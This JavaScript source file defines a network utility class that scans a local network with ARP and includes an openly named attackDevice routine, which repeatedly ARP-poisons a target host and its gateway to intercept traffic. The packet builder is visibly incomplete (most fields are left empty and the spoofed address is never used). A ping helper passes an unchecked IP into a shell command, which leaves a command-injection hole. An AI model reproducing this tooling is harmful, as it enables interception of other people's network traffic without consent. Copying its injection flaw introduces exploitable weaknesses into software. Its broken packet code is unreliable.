import { exec } from 'child_process';
import { promisify } from 'util';
import logger from './logger.js';
import raw from 'raw-socket';
import arp from 'node-arp';





const execAsync = promisify(exec);

class NetworkUtils {
    static async scanNetwork() {
        try {
            const { stdout } = await execAsync('arp -a');

            if (!stdout) {
                logger.warn('No ARP data returned');
                return [];
            }

            const devices = stdout
                .split('\n')
                .filter(line => line.includes('dynamic'))
                .map(line => {
                    const matches = line.match(/(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9-]+)/i);
                    if (!matches) return null;

                    return {
                        ip: matches[1],
                        mac: matches[2].replace(/-/g, ':'),
                        status: 'active'
                    };
                })
                .filter(Boolean);

            logger.info(`Found ${devices.length} devices`);
            return devices;
        } catch (error) {
            logger.error('Scan failed:', error);
            return [];
        }
    }

    static async attackDevice(targetIP, gatewayIP) {
        try {
            const socket = raw.createSocket({ protocol: raw.Protocol.ETH_P_ALL });
            const targetMAC = await this.getMACAddress(targetIP);
            const gatewayMAC = await this.getMACAddress(gatewayIP);

            if (!targetMAC || !gatewayMAC) {
                logger.error('MAC address retrieval failed.');
                return null;
            }

            const interval = setInterval(() => {
                this.sendARPPoison(socket, targetIP, targetMAC, gatewayIP);
                this.sendARPPoison(socket, gatewayIP, gatewayMAC, targetIP);
            }, 1000);

            return {
                stop: () => {
                    clearInterval(interval);
                    socket.close();
                    logger.info('Attack stopped.');
                }
            };
        } catch (error) {
            logger.error('Attack failed:', error);
            return null;
        }
    }

    static sendARPPoison(socket, targetIP, targetMAC, spoofIP) {
        const packet = Buffer.alloc(42);
        targetMAC.split(':').forEach((oct, i) => (packet[i] = parseInt(oct, 16)));
        socket.send(packet);
    }



    static async getGatewayInfo() {
        try {
            const { stdout } = await execAsync('ipconfig | findstr /i "Default Gateway"');
            const match = stdout.match(/\d+\.\d+\.\d+\.\d+/);
            if (!match) throw new Error('Gateway not found');
            const gateway = match[0];
            logger.info(`Gateway found: ${gateway}`);
            return { gateway };
        } catch (error) {
            logger.error('Failed to get gateway:', error);
            return null;
        }
    }

    static async getMACAddress(ip) {
        return new Promise((resolve, reject) => {
            arp.getMAC(ip, (err, mac) => {
                if (err) {
                    logger.error(`Failed to retrieve MAC for ${ip}`);
                    reject(err);
                }
                resolve(mac);
            });
        });
    }



    static async checkDeviceStatus(ip) {
        return new Promise((resolve) => {
            exec(`ping -n 1 ${ip}`, (error, stdout) => {
                resolve(!error && stdout.includes('TTL='));
            });
        });
    }
}

export default NetworkUtils;
